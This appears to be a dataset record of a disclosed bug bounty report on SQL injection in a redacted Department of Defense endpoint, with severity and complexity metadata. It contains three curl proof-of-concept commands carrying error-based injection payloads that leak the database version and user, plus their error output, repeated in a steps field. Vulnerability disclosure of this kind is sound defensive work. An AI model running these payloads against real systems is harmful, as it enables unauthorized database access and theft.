{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "lubak ",
  "title": "SQL Injection in \u2588\u2588\u2588\u2588\u2588",
  "content": "\nReferences\nImpact\nBy using SQL injection, an attacker can exfiltrate the whole database, and gain RCE\nSystem Host(s)\n\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\n\u2588\u2588\u2588\u2588\nCVE Numbers\nSteps to Reproduce\nPOC 1 - curl command injecting query, returning database version:\ncurl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -X POST -data=\"url=%2F\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&\u2588\u2588\u2588\u2588\u2588\u2588\u2588=AA'+OR(cast(version as date))LIKE'A\" -k\nPOC 2 - curl command injecting query, returning current database:\ncurl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -X POST -data=\"url=%2F\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&\u2588\u2588\u2588=AA'+OR(cast(current_user as date))LIKE'A\" -k\n{\"msg\":\"fail\",\"err\":\"ERROR: invalid input syntax for type timestamp: \\\"\u2588\u2588\u2588\u2588\\\"\"}\nPOC 3 - curl command injecting query, returning current user:\ncurl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -X POST -data=\"url=%2F\u2588\u2588\u2588\u2588&\u2588\u2588\u2588\u2588\u2588=AA'+OR(cast(current_user as date))LIKE'A\" -k\n{\"msg\":\"fail\",\"err\":\"ERROR: invalid input syntax for type timestamp: \\\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\\"\"}\nSuggested Mitigation/Remediation Actions\nThe vulnerable parameter \"\u2588\u2588\u2588\u2588\u2588\" in the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 endpoint should be sanitized properly. Usually this is done by implementing prepared statement.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1649375940,
  "report_url": "https://hackerone.com/reports/1489744",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Use curl to inject a SQL query that returns the database version: curl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -X POST -data=\"url=%2F\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&\u2588\u2588\u2588\u2588\u2588\u2588\u2588=AA'+OR(cast(version as date))LIKE'A\" -k"
    ],
    [
      2,
      "Use curl to inject a SQL query that returns the current database user: curl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -X POST -data=\"url=%2F\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&\u2588\u2588\u2588=AA'+OR(cast(current_user as date))LIKE'A\" -k"
    ],
    [
      3,
      "Use curl to inject a SQL query that returns the current user: curl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -X POST -data=\"url=%2F\u2588\u2588\u2588\u2588&\u2588\u2588\u2588\u2588\u2588=AA'+OR(cast(current_user as date))LIKE'A\" -k"
    ]
  ],
  "vuln_description": "This is a SQL injection vulnerability that allows an attacker to exfiltrate the entire database and potentially gain remote code execution (RCE). The vulnerability is present in the parameter \"\u2588\u2588\u2588\u2588\u2588\" of the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 endpoint, which is not properly sanitized.",
  "reason": "The vulnerability involves straightforward SQL injection techniques without requiring complex interactions or state manipulation. The attack vectors are typical and well-documented in SQL injection scenarios.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves manipulating input parameters to execute arbitrary SQL queries, which is not directly related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, not on input validation or SQL query manipulation.",
    "is_detectable": false
  }
}